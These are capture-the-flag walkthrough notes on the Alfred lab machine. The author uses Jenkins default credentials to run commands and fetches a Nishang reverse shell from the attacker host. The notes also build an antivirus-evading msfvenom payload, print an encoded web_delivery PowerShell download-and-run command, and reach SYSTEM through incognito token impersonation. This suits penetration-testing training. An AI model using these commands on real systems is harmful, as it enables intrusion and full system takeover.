---
Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
---

![](https://i.imgur.com/goE7bn7.png)

###  Initial Access 

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using Nishang to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.41.147  
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 11:47 EDT
Nmap scan report for 10.10.41.147
Host is up (0.20s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  tcpwrapped
|_ssl-date: 2022-09-27T15:48:04+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2022-09-26T14:55:40
|_Not valid after:  2023-03-28T14:55:40
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Phone|8.1|Vista (90%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   201.98 ms 10.11.0.1
2   194.40 ms 10.10.41.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.45 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.41.147


http://10.10.41.147:8080/

Default credentials for Jenkins are admin:password but we know here (look at the format of the expected answer) that both the login and the passwords are 5 characters. 

admin:admin

To execute commands via Jenkins, follow these steps:

    Connect with http#58;//10.10.31.231:8080/ using admin:admin
    From the dashboard, click on “project”
    From the menu on the left hand side, click on “Configure”.
    Scroll down to the “Build” section and enter a command (e.g. “ipconfig”)
    Click on the “Save” button
    Back to the Project view, click on “Build now” from the menu on the left hand side
    Wait until you see a new build number (e.g. “#2”) from the “Build history” box under the menu
    Click on the build number that has been added. 9. From the menu, click on “Console output”. From here you will get the result of your command.

Based on this, we will create a reverse shell.

First, download the Invoke-PoweShellTcp.ps1 powershell script and make it available through a web server: 


┌──(kali㉿kali)-[~]
└─$ mkdir alfred   
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ cd alfred              
                                                                                                    
┌──(kali㉿kali)-[~/alfred]
└─$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 
--2022-09-27 11:59:54--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4339 (4.2K) [text/plain]
Saving to: ‘Invoke-PowerShellTcp.ps1’

Invoke-PowerShellTcp.ps1 100%[==================================>]   4.24K  --.-KB/s    in 0.001s  

2022-09-27 11:59:54 (8.11 MB/s) - ‘Invoke-PowerShellTcp.ps1’ saved [4339/4339]

                                                                                                    
┌──(kali㉿kali)-[~/alfred]
└─$ ls
Invoke-PowerShellTcp.ps1
                                                                                                    
┌──(kali㉿kali)-[~/alfred]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.41.147 - - [27/Sep/2022 12:02:49] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

in jenkins

powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.81.220:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.81.220 -Port 1337 

revshell

┌──(kali㉿kali)-[~/alfred]
└─$ rlwrap nc -nlvp 1337 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.41.147.
Ncat: Connection from 10.10.41.147:49252.
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::e070:3b61:2d11:260%13
   IPv4 Address. . . . . . . . . . . : 10.10.41.147
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
PS C:\Program Files (x86)\Jenkins\workspace\project> more 'C:\users\bruce\desktop\user.txt'
79007a09481963edf2e1321abd9ae2a0


```

How many ports are open? (TCP only)
*3*


What is the username and password for the log in panel(in the format username:password)
*admin:admin*


![[Pasted image 20220927095714.png]]

![[Pasted image 20220927105933.png]]

![[Pasted image 20220927110310.png]]

![[Pasted image 20220927110338.png]]

What is the user.txt flag? 
use nishang to get a reverse shell
*79007a09481963edf2e1321abd9ae2a0*

### Switching Shells 

![|333](https://i.imgur.com/c7WqHoH.png)
To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

	msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

	powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

Before running this program, ensure the handler is set up in metasploit:

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

﻿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell

Start-Process "shell-name.exe"

This should spawn a meterpreter shell for you!

```
┌──(kali㉿kali)-[~/alfred]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.220 LPORT=1234 -f exe -o nishang.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: nishang.exe
```

What is the final size of the exe payload that you generated?
*73802*

### Privilege Escalation 

![|333](https://i.imgur.com/0eEIphY.png)

Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

    user SIDs(security identifier)
    group SIDs
    privileges

amongst other things. More detailed information can be found [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

    primary access tokens: those associated with a user account that are generated on log on
    impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

    SecurityAnonymous: current user/client cannot impersonate another user/client
    SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
    SecurityImpersonation: current user/client can impersonate the client's security context on the local system
    SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

    SeImpersonatePrivilege
    SeAssignPrimaryPrivilege
    SeTcbPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeCreateTokenPrivilege
    SeLoadDriverPrivilege
    SeTakeOwnershipPrivilege
    SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).

```
                                                                                                    
┌──(kali㉿kali)-[~/alfred]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:1234 
[*] Sending stage (175686 bytes) to 10.10.41.147

in jenkins

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.81.220:1234/nishang.exe','nishang.exe')"

however fails

Let’s use a different approach to directly upload a reverse shell

Let’s rather use exploit/multi/script/web_delivery. 


┌──(kali㉿kali)-[~/alfred]
└─$ msfconsole -q
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
msf6 exploit(multi/script/web_delivery) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/script/web_delivery) > set target PSH
target => PSH
msf6 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must
                                        be an address on the local machine or 0.0.0.0 to listen on
                                        all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly gener
                                       ated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.11.81.220     yes       The listen address (an interface may be specified)
   LPORT     1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH


msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.11.81.220:1234 
[*] Using URL: http://10.11.81.220:8080/JIKW2V
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABrAFkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAawBZAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAawBZAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4AOAAxAC4AMgAyADAAOgA4ADAAOAAwAC8ASgBJAEsAVwAyAFYALwB0AHUAWQAyAHYAcgBzAGMAMQBCAGYAdAAwAEkAYwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4AOAAxAC4AMgAyADAAOgA4ADAAOAAwAC8ASgBJAEsAVwAyAFYAJwApACkAOwA=
msf6 exploit(multi/script/web_delivery) > [*] 10.10.41.147     web_delivery - Delivering AMSI Bypass (1391 bytes)
[*] 10.10.41.147     web_delivery - Delivering Payload (3523 bytes)
[*] Sending stage (175686 bytes) to 10.10.41.147
[*] Meterpreter session 1 opened (10.11.81.220:1234 -> 10.10.41.147:49278) at 2022-09-27 12:24:29 -0400

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  alfred\bruce @ ALFRED  10.11.81.220:1234 -> 10.10.41.147:4927
                                                            8 (10.10.41.147)

msf6 exploit(multi/script/web_delivery) > 


so upload the b64 into jenkins the same before

priv esc



msf6 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 1080 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

C:\Program Files (x86)\Jenkins\workspace\project>^Z
Background channel 1? [y/N]  y
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\TermService
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc

meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ps

Process List
============

 PID   PPID  Name             Arch  Session  User                       Path
 ---   ----  ----             ----  -------  ----                       ----
 0     0     [System Process
             ]
 4     0     System           x64   0
 396   4     smss.exe         x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\smss.e
                                                                        xe
 524   516   csrss.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\csrss.
                                                                        exe
 572   564   csrss.exe        x64   1        NT AUTHORITY\SYSTEM        C:\Windows\System32\csrss.
                                                                        exe
 580   516   wininit.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\winini
                                                                        t.exe
 608   564   winlogon.exe     x64   1        NT AUTHORITY\SYSTEM        C:\Windows\System32\winlog
                                                                        on.exe
 668   580   services.exe     x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\servic
                                                                        es.exe
 676   580   lsass.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\lsass.
                                                                        exe
 684   580   lsm.exe          x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\lsm.ex
                                                                        e
 720   1808  cmd.exe          x86   0        alfred\bruce               C:\Windows\SysWOW64\cmd.ex
                                                                        e
 772   668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
                                                                        t.exe
 848   668   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\svchos
                                             ICE                        t.exe
 864   668   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svchos
                                             E                          t.exe
 920   608   LogonUI.exe      x64   1        NT AUTHORITY\SYSTEM        C:\Windows\System32\LogonU
                                                                        I.exe
 936   668   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svchos
                                             E                          t.exe
 988   668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
                                                                        t.exe
 1012  668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
                                                                        t.exe
 1068  668   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\svchos
                                             ICE                        t.exe
 1080  2224  cmd.exe          x86   0        alfred\bruce               C:\Windows\SysWOW64\cmd.ex
                                                                        e
 1212  668   spoolsv.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\spools
                                                                        v.exe
 1240  668   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svchos
                                             E                          t.exe
 1344  668   amazon-ssm-agen  x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\SS
             t.exe                                                      M\amazon-ssm-agent.exe
 1424  668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
                                                                        t.exe
 1452  668   LiteAgent.exe    x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\Xe
                                                                        ntools\LiteAgent.exe
 1480  668   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\System32\svchos
                                             E                          t.exe
 1616  668   jenkins.exe      x64   0        alfred\bruce               C:\Program Files (x86)\Jen
                                                                        kins\jenkins.exe
 1732  668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
                                                                        t.exe
 1808  1616  java.exe         x86   0        alfred\bruce               C:\Program Files (x86)\Jen
                                                                        kins\jre\bin\java.exe
 1820  668   Ec2Config.exe    x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\Ec
                                                                        2ConfigService\Ec2Config.e
                                                                        xe
 1896  524   conhost.exe      x64   0        alfred\bruce               C:\Windows\System32\conhos
                                                                        t.exe
 2036  668   sppsvc.exe       x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\sppsvc
                                             ICE                        .exe
 2060  668   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\svchos
                                             ICE                        t.exe
 2224  720   powershell.exe   x86   0        alfred\bruce               C:\Windows\SysWOW64\Window
                                                                        sPowerShell\v1.0\powershel
                                                                        l.exe
 2240  524   conhost.exe      x64   0        alfred\bruce               C:\Windows\System32\conhos
                                                                        t.exe
 2312  772   WmiPrvSE.exe     x64   0        NT AUTHORITY\NETWORK SERV  C:\Windows\System32\wbem\W
                                             ICE                        miPrvSE.exe
 2732  668   svchost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\svchos
                                                                        t.exe
 2816  524   conhost.exe      x64   0        alfred\bruce               C:\Windows\System32\conhos
                                                                        t.exe
 2992  668   SearchIndexer.e  x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\Search
             xe                                                         Indexer.exe
 2996  668   TrustedInstalle  x64   0        NT AUTHORITY\SYSTEM        C:\Windows\servicing\Trust
             r.exe                                                      edInstaller.exe


We want to migrate to a process that is owned by NT AUTHORITY\SYSTEM (e.g. svchost.exe with PID 2732): 


meterpreter > migrate 2732
[*] Migrating from 2224 to 2732...
[*] Migration completed successfully.
meterpreter > shell
Process 1628 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd config
cd config

C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E033-3EDD

 Directory of C:\Windows\System32\config

09/27/2022  03:56 PM    <DIR>          .
09/27/2022  03:56 PM    <DIR>          ..
10/25/2019  10:46 PM            28,672 BCD-Template
09/27/2022  04:08 PM        18,087,936 COMPONENTS
09/27/2022  04:13 PM           262,144 DEFAULT
07/14/2009  03:34 AM    <DIR>          Journal
09/27/2022  04:12 PM    <DIR>          RegBack
10/26/2019  12:36 PM                70 root.txt
09/27/2022  03:55 PM           262,144 SAM
09/27/2022  04:07 PM           262,144 SECURITY
09/27/2022  05:15 PM        38,797,312 SOFTWARE
09/27/2022  05:27 PM        10,485,760 SYSTEM
11/21/2010  03:41 AM    <DIR>          systemprofile
10/25/2019  09:47 PM    <DIR>          TxR
               8 File(s)     68,186,182 bytes
               6 Dir(s)  20,426,838,016 bytes free

C:\Windows\System32\config>more root.txt
more root.txt
dff0f748678f280250f25a45b8046b4a



```

View all the privileges using whoami /priv



You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.


	To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?

	*NT AUTHORITY\SYSTEM*


Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS




	read the root.txt file at C:\Windows\System32\config
either do this by dropping into a shell or using a meterpreter command

*dff0f748678f280250f25a45b8046b4a*

[[Res]]

